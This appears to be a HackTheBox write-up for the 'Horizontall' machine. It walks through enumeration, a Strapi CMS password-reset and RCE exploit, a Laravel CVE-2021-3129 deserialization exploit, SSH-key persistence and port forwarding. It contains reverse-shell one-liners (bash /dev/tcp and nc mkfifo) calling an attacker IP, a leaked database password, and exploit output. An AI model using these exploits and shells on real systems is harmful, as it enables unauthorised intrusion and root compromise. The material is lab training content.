---
title: "Horizontall"
date: 2022-09-20T14:03:31+01:00
draft: false
categories:
  - HackTheBox
---

first add `horizontall.htb` to `/etc/hosts`

## Enumeration

```bash
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDL2qJTqj1aoxBGb8yWIN4UJwFs4/UgDEutp3aiL2/6yV2iE78YjGzfU74VKlTRvJZWBwDmIOosOBNl9nfmEzXerD0g5lD5SporBx06eWX/XP2sQSEKbsqkr7Qb4ncvU8CvDR6yGHxmBT8WGgaQsA2ViVjiqAdlUDmLoT2qA3GeLBQgS41e+TysTpzWlY7z/rf/u0uj/C3kbixSB/upkWoqGyorDtFoaGGvWet/q7j5Tq061MaR6cM2CrYcQxxnPy4LqFE3MouLklBXfmNovryI0qVFMki7Cc3hfXz6BmKppCzMUPs8VgtNgdcGywIU/Nq1aiGQfATneqDD2GBXLjzV
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIyw6WbPVzY28EbBOZ4zWcikpu/CPcklbTUwvrPou4dCG4koataOo/RDg4MJuQP+sR937/ugmINBJNsYC8F7jN0=
|   256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJqmDVbv9RjhlUzOMmw3SrGPaiDBgdZ9QZ2cKM49jzYB

80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
|_http-title: horizontall
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 1BA2AE710D927F13D483FD5D1E548C9B
| http-methods:
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
                        [Status: 200, Size: 901, Words: 43, Lines: 2]
css                     [Status: 301, Size: 194, Words: 7, Lines: 8]
img                     [Status: 301, Size: 194, Words: 7, Lines: 8]
index.html              [Status: 200, Size: 901, Words: 43, Lines: 2]
js                      [Status: 301, Size: 194, Words: 7, Lines: 8]
favicon.ico             [Status: 200, Size: 4286, Words: 1, Lines: 1]


//api-prod subdomain

admin                   [Status: 200, Size: 854, Words: 98, Lines: 17]
ADMIN                   [Status: 200, Size: 854, Words: 98, Lines: 17]
Admin                   [Status: 200, Size: 854, Words: 98, Lines: 17]
favicon.ico             [Status: 200, Size: 1150, Words: 4, Lines: 1]
index.html              [Status: 200, Size: 413, Words: 76, Lines: 20]
reviews                 [Status: 200, Size: 507, Words: 21, Lines: 1]
robots.txt              [Status: 200, Size: 121, Words: 19, Lines: 4]
users                   [Status: 403, Size: 60, Words: 1, Lines: 1]

```

hmm...little information

Aaaaand I was stuck for yeeaaars!

until I did a `vhost` enumeration with gobuster

```bash
└──╼ $gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt  -u http://horizontall.htb/
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://horizontall.htb/
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/12/06 14:30:04 Starting gobuster in VHOST enumeration mode
===============================================================
Found: api-prod.horizontall.htb (Status: 200
```

we add `api-prod.horizontall.htb` to our hosts too
We get a welcome page now and there is nothing in source code...we fuzz that again
The `admin` login page uses `strapi cms`
the version can be found in the javascript file

we exploit that

```bash
└──╼ $python 50239.py http://api-prod.horizontall.htb
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit

[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM4ODAyMTg1LCJleHAiOjE2NDEzOTQxODV9.FPJVjEL71Mh8aHMWBjeOTxD5tujDziJ8n9N_cD63X_Q
```
And we get a shell on another listenner

```bash
$> bash -c 'exec bash -i &>/dev/tcp/10.10.15.45/4444 <&1'
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output
```
For more comfort

```bash
strapi@horizontall:~/myapi$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Get flag

```bash
strapi@horizontall:/home/developer$ ls
ls
composer-setup.php  myproject  user.txt
strapi@horizontall:/home/developer$ cat user.txt
cat user.txt
the_flag_of_patience_lol
```

## Privilege escalation

no password so we are very limited...we upload and use `linpeas` and found

```bash
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1847/node /usr/bin/
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
```
And these

```bash
strapi@horizontall:~/myapi/config/environments/development$ cat database.json
cat database.json
{
  "defaultConnection": "default",
  "connections": {
    "default": {
      "connector": "strapi-hook-bookshelf",
      "settings": {
        "client": "mysql",
        "database": "strapi",
        "host": "127.0.0.1",
        "port": 3306,
        "username": "developer",
        "password": "#J!:F9Zt2u"
      },
      "options": {}
    }
  }
}
```
port `8000` is highly suspicious

First lets create ssh keys for persistent access and add pub key to authorized_keys

its possible in `/opt/strapi/.ssh`

now we have ssh access

ssh portforward to our local port 8000
` $ssh -i id_rsa -L 8000:127.0.0.1:8000 strapi@horizontall.htb`

And access `127.0.0.1:8000` in browser

Oh its laravel `Laravel v8 (PHP v7.4.18) `
there is `CVE-2021-3129_exploit` for that...find it on github

```bash
└──╼ $./exploit.py http://localhost:8000 Monolog/RCE1 "uname -a"
[i] Trying to clear logs
[+] Logs cleared
[i] PHPGGC not found. Cloning it
Clonage dans 'phpggc'...
remote: Enumerating objects: 2673, done.
remote: Counting objects: 100% (1015/1015), done.
remote: Compressing objects: 100% (576/576), done.
remote: Total 2673 (delta 414), reused 883 (delta 308), pack-reused 1658
Réception d'objets: 100% (2673/2673), 400.37 Kio | 96.00 Kio/s, fait.
Résolution des deltas: 100% (1056/1056), fait.
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited

Linux horizontall 4.15.0-154-generic #161-Ubuntu SMP Fri Jul 30 13:04:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux

[i] Trying to clear logs
[+] Logs cleared
```
it works...we can get root now

```bash
└──╼ $./exploit.py http://localhost:8000 Monolog/RCE1 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.45 2311 >/tmp/f"
[i] Trying to clear logs
[+] Logs cleared
[+] PHPGGC found. Generating payload and deploy it to the target
[+] Successfully converted logs to PHAR
[i] There is no output
[i] Trying to clear logs
...

```
And we get it on our listener

```bash
└──╼ $nc -lnvp 2311
listening on [any] 2311 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 42990
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
boot.sh
pid
restart.sh
root.txt
# cat root.txt
the_flag_of_dedication_kek
```

room finito!

